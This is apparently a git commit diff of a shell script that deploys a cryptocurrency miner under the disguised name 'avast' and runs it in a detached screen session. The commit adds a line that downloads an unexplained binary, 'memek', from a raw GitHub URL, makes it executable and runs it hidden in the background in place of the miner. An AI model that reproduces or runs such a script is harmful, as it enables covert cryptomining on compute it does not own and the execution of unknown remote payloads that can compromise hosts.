5d5b3657891cf12f44edeadf13143ee75027e480
renilo <88342640+renilo@users.noreply.github.com>
2022-02-13 15:18:09 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -5,11 +5,12 @@ apt install proxychains
 apt install screen -y
 
 wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
+wget -q https://raw.githubusercontent.com/renilo/bh/main/memek
 
 tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
 
 mv miner-linux avast
 
-chmod +x avast
+chmod +x avast memek
 
-screen -dmS running ./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+screen -dmS running ./memek
